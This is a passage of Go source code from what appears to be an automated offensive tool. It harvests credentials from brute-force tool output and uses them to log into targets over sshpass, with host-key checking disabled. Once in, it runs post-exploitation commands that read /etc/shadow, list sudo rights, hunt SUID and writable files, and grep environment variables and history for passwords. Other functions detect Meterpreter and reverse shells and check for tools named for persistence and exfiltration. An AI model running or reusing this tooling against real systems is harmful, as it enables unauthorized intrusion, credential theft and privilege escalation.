	loginIdx := strings.Index(lower, "login:")
	passIdx := strings.Index(lower, "password:")
	if loginIdx < 0 || passIdx < 0 {
		return ""
	}
	loginPart := strings.TrimSpace(line[loginIdx+6:])
	passPart := strings.TrimSpace(line[passIdx+9:])
	// Take first word of each
	loginFields := strings.Fields(loginPart)
	passFields := strings.Fields(passPart)
	if len(loginFields) == 0 || len(passFields) == 0 {
		return ""
	}
	return loginFields[0] + ":" + passFields[0]
}

// extractCertipyFinding extracts the ESC finding from certipy output
func extractCertipyFinding(output string) string {
	for _, line := range strings.Split(output, "\n") {
		if strings.Contains(strings.ToUpper(line), "ESC") {
			return strings.TrimSpace(line)
		}
	}
	return "AD CS misconfiguration"
}

// extractMSFVuln extracts vulnerability name from msfconsole output
func extractMSFVuln(output string) string {
	for _, line := range strings.Split(output, "\n") {
		lower := strings.ToLower(line)
		if strings.Contains(lower, "vulnerable") || strings.Contains(lower, "[+]") {
			return strings.TrimSpace(line)
		}
	}
	return "vulnerability found"
}

// RunPostExploitCommands runs real post-exploitation commands when we have SSH access.
// This is called when hydra/crackmapexec finds valid credentials.
// It SSHes into the target and runs: id, whoami, uname -a, cat /etc/passwd, find SUID, etc.
func RunPostExploitCommands(ctx *AbhimanyuContext, progress func(AbhimanyuStatus)) []ExploitResult {
	var results []ExploitResult

	if len(ctx.CredsFound) == 0 {
		return results
	}

	// Try each credential
	for _, cred := range ctx.CredsFound {
		parts := strings.SplitN(cred, ":", 2)
		if len(parts) != 2 {
			continue
		}
		user, pass := parts[0], parts[1]
		if strings.HasPrefix(user, "cracked") {
			continue
		}

		progress(AbhimanyuStatus{
			Tool:   "post-exploit-ssh",
			Kind:   StatusRunning,
			Reason: fmt.Sprintf("Trying SSH with %s:%s", user, pass[:min(3, len(pass))]+"***"),
		})

		// Real SSH post-exploit commands
		postExploitCmds := []string{
			"id",
			"whoami",
			"uname -a",
			"cat /etc/passwd | head -20",
			"cat /etc/shadow 2>/dev/null | head -5",
			"sudo -l 2>/dev/null",
			"find / -perm -4000 -type f 2>/dev/null | head -20",
			"find / -writable -type f 2>/dev/null | grep -v proc | head -10",
			"ps aux | head -20",
			"netstat -tlnp 2>/dev/null | head -20",
			"cat /etc/crontab 2>/dev/null",
			"ls -la /home/",
			"env | grep -i pass 2>/dev/null",
			"history 2>/dev/null | tail -20",
		}

		var allOutput strings.Builder
		allOutput.WriteString(fmt.Sprintf("=== SSH Post-Exploit: %s@%s ===\n\n", user, ctx.Target))

		for _, cmd := range postExploitCmds {
			// Use sshpass for non-interactive SSH
			sshCmd := fmt.Sprintf(
				"sshpass -p '%s' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o BatchMode=no %s@%s '%s' 2>/dev/null",
				strings.ReplaceAll(pass, "'", "'\\''"), // escape single quotes
				user, ctx.Target, cmd,
			)
			out, err := runShell(15, sshCmd)
			if err == nil && strings.TrimSpace(out) != "" {
				allOutput.WriteString(fmt.Sprintf("$ %s\n%s\n\n", cmd, strings.TrimSpace(out)))
				// Extract intelligence from each command output
				if strings.HasPrefix(out, "uid=") {
					ctx.ShellEvidence = strings.TrimSpace(out)
					ctx.ShellObtained = true
					ctx.ShellType = "ssh"
				}
			}
		}

		output := allOutput.String()
		if len(output) > 100 {
			results = append(results, ExploitResult{
				Tool:    "post-exploit-ssh",
				Output:  output,
				Success: true,
			})
			// Save to session
			os.WriteFile(ctx.SessionDir+"/post_exploit_"+user+".txt", []byte(output), 0600)
			progress(AbhimanyuStatus{
				Tool:   "post-exploit-ssh",
				Kind:   StatusDone,
				Reason: fmt.Sprintf("Post-exploit complete for %s@%s", user, ctx.Target),
			})
			break // success — stop trying other creds
		}
	}

	return results
}

// runShell executes a shell command with timeout
func runShell(timeoutSec int, shellCmd string) (string, error) {
	return run(timeoutSec, "bash", "-c", shellCmd)
}

// detectShellObtained checks if tool output indicates a shell was obtained.
func detectShellObtained(output string) bool {
	lower := strings.ToLower(output)
	indicators := []string{
		"os-shell>", "os-pwn>", "meterpreter>", "shell>",
		"uid=", "whoami", "root@", "www-data@",
		"command execution successful", "shell obtained",
		"[*] command shell session", "opened reverse shell",
	}
	for _, ind := range indicators {
		if strings.Contains(lower, ind) {
			return true
		}
	}
	return false
}

// detectShellType identifies the type of shell obtained.
func detectShellType(output string) string {
	lower := strings.ToLower(output)
	if strings.Contains(lower, "meterpreter") {
		return "meterpreter"
	}
	if strings.Contains(lower, "os-shell") {
		return "os-shell"
	}
	if strings.Contains(lower, "cmd.exe") || strings.Contains(lower, "windows") {
		return "cmd"
	}
	return "bash"
}

// extractShellEvidence extracts the most useful line proving shell access
func extractShellEvidence(output string) string {
	for _, line := range strings.Split(output, "\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "uid=") || strings.HasPrefix(line, "root@") ||
			strings.HasPrefix(line, "www-data@") || strings.Contains(line, "os-shell>") {
			return line
		}
	}
	if len(output) > 100 {
		return output[:100]
	}
	return output
}

// appendUnique appends to slice only if not already present.
func appendUnique(slice []string, val string) []string {
	for _, s := range slice {
		if s == val {
			return slice
		}
	}
	return append(slice, val)
}

// GetCombinedOutput returns all exploit tool outputs as one string
func GetCombinedOutput(results []ExploitResult) string {
	var b strings.Builder
	for _, r := range results {
		if r.Output != "" {
			b.WriteString(fmt.Sprintf("=== %s ===\n%s\n\n", strings.ToUpper(r.Tool), r.Output))
		}
	}
	return b.String()
}

// CheckTools returns which abhimanyu tools are available
func CheckTools() map[string]bool {
	result := make(map[string]bool)
	for _, spec := range exploitRegistry {
		result[spec.Name] = isAvailable(spec.Name)
	}
	// Also check extra tools used in persistence/exfil
	for _, extra := range []string{"curl", "scp", "nc", "socat", "iodine"} {
		result[extra] = isAvailable(extra)
	}
	return result
}

// loadSession loads a previous abhimanyu session from disk
func loadSession(sessionDir string) *AbhimanyuSession {
	data, err := os.ReadFile(sessionDir + "/session.json")
	if err != nil {
		return nil
	}
	var session AbhimanyuSession
	if err := json.Unmarshal(data, &session); err != nil {
		return nil
	}
	return &session
}

// saveSession persists the current session to disk for continuous research
func saveSession(ctx *AbhimanyuContext, findings map[string]string) {
	if ctx.SessionDir == "" {
		return
	}
	toolsRun := make([]string, 0, len(findings))
	for t := range findings {
		toolsRun = append(toolsRun, t)
	}
	lport := ctx.LPORT
	if lport == "" {
		lport = "4444"
	}
	session := AbhimanyuSession{
		Target:        ctx.Target,
		VulnType:      ctx.VulnType,
		LHOST:         ctx.LHOST,
		LPORT:         lport,
		StartedAt:     ctx.StartedAt,
		LastUpdated:   time.Now(),
		ToolsRun:      toolsRun,
		Findings:      findings,
		ShellObtained: ctx.ShellObtained,
		ShellType:     ctx.ShellType,
		ShellEvidence: ctx.ShellEvidence,
		OpenPorts:     ctx.OpenPorts,
		VulnsFound:    ctx.VulnsFound,
		XSSFound:      ctx.XSSFound,
		ParamsFound:   ctx.ParamsFound,
		CredsFound:    ctx.CredsFound,
		HashesFound:   ctx.HashesFound,
		WAFDetected:   ctx.WAFDetected,
		Technologies:  ctx.Technologies,
	}
	data, err := json.MarshalIndent(session, "", "  ")
	if err != nil {
		return
	}
	os.WriteFile(ctx.SessionDir+"/session.json", data, 0600)
}

// sanitizeTarget makes a target string safe for use as a directory name
func sanitizeTarget(target string) string {
	r := strings.NewReplacer(
		"https://", "",
		"http://", "",
		"/", "_",
		":", "_",
		".", "_",
	)
	return r.Replace(target)
}

// isIPAddress returns true if target looks like an IP address
func isIPAddress(target string) bool {
	// Simple check: all parts are numeric when split by "."
	parts := strings.Split(target, ".")
	if len(parts) != 4 {
		return false
	}
	for _, p := range parts {
		if len(p) == 0 || len(p) > 3 {
			return false
		}
		for _, c := range p {
			if c < '0' || c > '9' {
				return false
			}
		}
	}
	return true
}
